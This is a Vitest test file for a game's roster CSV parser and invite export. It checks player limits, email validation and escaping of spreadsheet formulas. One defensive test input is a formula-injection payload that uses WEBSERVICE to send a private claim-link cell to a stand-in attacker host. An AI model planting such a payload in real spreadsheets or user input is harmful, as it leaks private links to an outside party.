import { describe, expect, it } from 'vitest';
import { createInviteExport, csvCell, parseRosterCsv } from './csv';

function validCsv(count = 20): string {
  return [
    'display_name,email',
    ...Array.from({ length: count }, (_, index) => `Player ${index + 1},player${index + 1}@example.com`),
  ].join('\n');
}

describe('roster CSV', () => {
  it.each([6, 19, 20, 80])('accepts a %i-player roster', (count) => {
    const result = parseRosterCsv(validCsv(count));
    expect(result.errors).toEqual([]);
    expect(result.entries).toHaveLength(count);
  });

  it.each([5, 81])('rejects a %i-player roster', (count) => {
    const result = parseRosterCsv(validCsv(count));
    expect(result.entries).toHaveLength(count);
    expect(result.errors).toContain('The roster must contain between 6 and 80 valid players.');
  });

  it('lets a list added to an existing roster be any size from one player up', () => {
    expect(parseRosterCsv(validCsv(1), { minPlayers: 1 }).errors).toEqual([]);
    expect(parseRosterCsv(validCsv(80), { minPlayers: 1 }).errors).toEqual([]);
    const tooMany = parseRosterCsv(validCsv(81), { minPlayers: 1 });
    expect(tooMany.errors).toContain('The list must contain between 1 and 80 valid players.');
    // Without the option a roster still needs a playable number of players.
    expect(parseRosterCsv(validCsv(1)).errors).toContain('The roster must contain between 6 and 80 valid players.');
  });

  it('parses the required headers and a valid 20-player roster', () => {
    const result = parseRosterCsv(validCsv());
    expect(result.errors).toEqual([]);
    expect(result.entries).toHaveLength(20);
    expect(result.entries[0]).toEqual({ displayName: 'Player 1', email: 'player1@example.com' });
  });

  it('supports quoted names and identifies duplicate emails', () => {
    const result = parseRosterCsv(
      `${validCsv(19)}\n"Chen, Maya",player1@example.com`,
    );
    expect(result.errors).toContain('Line 21: email is duplicated.');
  });

  // A cell holding several addresses would send one player's private claim
  // link to every address in it.
  it.each([
    'ana@corp.test;bob@corp.test',
    '"ana@corp.test,bob@corp.test"',
    'Ana <ana@corp.test>',
    '<ana@corp.test>',
    'ana@corp.test;',
    'ana@bob@corp.test',
  ])('rejects %s as more than one plain address', (cell) => {
    const result = parseRosterCsv(`${validCsv(20)}\nAna,${cell}`);
    expect(result.errors).toContain('Line 22: email must be one plain address, like name@example.com.');
    expect(result.entries.map((entry) => entry.displayName)).not.toContain('Ana');
  });

  it('accepts an apostrophe, which mail tools do not treat as a separator', () => {
    const result = parseRosterCsv(`${validCsv(20)}\nSean,sean.o'brien@corp.test`);
    expect(result.errors).toEqual([]);
  });

  it('accepts ordinary addresses, including plus aliases and subdomains', () => {
    const result = parseRosterCsv(`${validCsv(20)}\nAna,Ana.Lee+werewolf@mail.corp.test`);
    expect(result.errors).toEqual([]);
    expect(result.entries.at(-1)).toEqual({ displayName: 'Ana', email: 'ana.lee+werewolf@mail.corp.test' });
  });

  it('creates a private mail-merge export without exposing roles', () => {
    const csv = createInviteExport([
      {
        displayName: 'Maya Chen',
        email: 'maya@example.com',
        claimUrl: 'https://game.test/claim/abc',
        inviteCode: 'ABC123',
      },
    ]);
    expect(csv).toContain('Maya Chen');
    expect(csv).toContain('ABC123');
    expect(csv).not.toMatch(/"role"|"WEREWOLF"|"SEER"|"BODYGUARD"|"DOCTOR"|"HUNTER"|"MASON"/u);
  });
  // A name typed on the public sign-up form lands in a file that is opened in a spreadsheet beside private links.
  it.each(['=WEBSERVICE("http://evil.test/?"&C2)', '+SUM(A1)', '-2+3', '@SUM(A1)', '\tcmd', '\rcmd'])('shows %j in a spreadsheet as text, never as a formula', (name) => {
    expect(csvCell(name).startsWith(`"'`)).toBe(true);
    const csv = createInviteExport([{ displayName: name, email: 'a@example.com', claimUrl: 'https://game.test/claim/abc', inviteCode: 'ABC123' }]);
    const [, row] = csv.split('\r\n');
    expect(row.startsWith(`"'`)).toBe(true);
  });

  it('leaves ordinary cells exactly as they were and still doubles quotes', () => {
    expect(csvCell('Maya Chen')).toBe('"Maya Chen"');
    expect(csvCell('Sean "Mac" O\'Brien')).toBe('"Sean ""Mac"" O\'Brien"');
    expect(csvCell('https://game.test/claim/abc')).toBe('"https://game.test/claim/abc"');
    expect(csvCell('')).toBe('""');
  });
});
